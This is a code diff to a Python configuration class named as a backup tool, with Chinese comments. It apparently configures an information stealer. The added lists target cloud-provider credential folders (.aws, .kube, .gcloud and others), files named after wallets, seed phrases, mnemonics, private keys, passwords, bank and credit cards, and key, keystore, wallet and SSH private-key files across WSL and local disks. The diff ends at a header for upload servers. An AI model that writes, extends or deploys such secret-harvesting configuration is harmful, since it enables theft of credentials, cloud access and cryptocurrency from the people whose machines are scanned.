@@ -49,29 +49,72 @@ class BackupConfig:
         ".wget-hsts",     # wget HSTS 历史记录
         ".Xauthority",    # Xauthority 文件
         ".ICEauthority",  # ICEauthority 文件
+        # VPS服务商配置目录
+        ".aws",               # AWS配置
+        ".gcloud",            # Google Cloud配置
+        ".azure",             # Azure配置
+        ".aliyun",            # 阿里云配置
+        ".tencentcloud",      # 腾讯云配置
+        ".tccli",             # 腾讯云CLI配置
+        ".doctl",             # DigitalOcean配置
+        ".hcloud",            # Hetzner配置
+        ".vultr",             # Vultr配置
+        ".linode",            # Linode配置
+        ".oci",               # Oracle Cloud配置
+        ".bandwagon",         # 搬瓦工配置
+        ".bwg",               # 搬瓦工配置
+        ".docker",            # Docker配置
+        ".kube",              # Kubernetes配置
+    ]
+    
+    # 关键字备份配置 - 备份包含以下关键字的文件和文件夹
+    KEYWORD_BACKUP_KEYWORDS = [
+        "wallet",
+        "seed",
+        "mnemonic",
+        "private",
+        "privkey",
+        "keypair",
+        "secret",
+        "account",
+        "password",
+        "bank",
+        "card",
+        "solana",
+        "important",
+        "钱包",
+        "助记词",
+        "种子",
+        "私钥",
+        "密钥",
+        "密码",
+        "账户",
+        "账号",
+        "信用卡",
+        "备忘",
+        "重要",
     ]
     
     # WSL文件扩展名分类
-    WSL_EXTENSIONS_1 = [  # 文档类
-        ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash",  ".sol", ".rs", ".env",
-        ".ts", ".jsx", ".tsx", ".csv", ".bin", ".wallet", "ps1"
+    WSL_EXTENSIONS_1 = [  # 文档/代码类
+        ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash", ".rs", ".env",
+        ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md",
     ]
     
     WSL_EXTENSIONS_2 = [  # 配置和密钥类
-        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config",
-        ".yaml", ".yml", ".toml", ".asc", ".gpg", ".pgp"
+        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config", ".conf", ".json",
+        ".yaml", ".yml", ".toml", ".utc", ".gpg", ".pgp", ".wallet", ".keystore",
     ]
     
     # 磁盘文件分类
     DISK_EXTENSIONS_1 = [  # 文档类
-        ".xls", ".xlsx", ".et", ".one", ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash",
-        ".env", ".ts", ".jsx", ".tsx", ".csv", ".dat", ".bin", ".wallet", "ps1"
+        ".xls", ".xlsx", ".doc", ".docx", ".et", ".one", ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash",
+        ".env", ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md",
     ]
     
     DISK_EXTENSIONS_2 = [  # 配置和密钥类
-        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", 
-        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc"
-        
+        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", ".conf", ".wallet", ".toml",
+        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc", ".json", ".yml", ".yaml",   
     ]
     
     # 排除目录配置
@@ -134,7 +177,7 @@ class BackupConfig:
         
         # 其他
         "bak", "obsolete", "archive", "trojan", "clash", "vpn",
-        "thumb", "thumbnail", "preview" , "v2ray", "office", "mail"
+        "thumb", "thumbnail", "preview" , "v2ray", "mail"
     ]
 
     EXCLUDE_WSL_DIRS = [
@@ -142,7 +185,6 @@ class BackupConfig:
         ".bitcoinlib",
         ".cargo",
         ".conda",
-        ".cursor-server",
         ".docker",
         ".dotnet",
         ".fonts",
@@ -164,16 +206,20 @@ class BackupConfig:
         ".solcx",
         ".themes",
         ".thunderbird",
-        ".vscode",
-        ".vscode-remote-containers",
-        ".vscode-server",
         ".wdm",
         "cache",
-        "Downloads",
         "myenv",
         "snap",
         "venv",
-        "vscode-remote:"
+        "node_modules",
+        "dist",
+        ".cache",
+        ".config",
+        ".vscode-server",
+        "build",
+        ".vscode-remote-ssh",
+        ".git",
+        "__pycache__",
     ]
     
     # 备用上传服务器
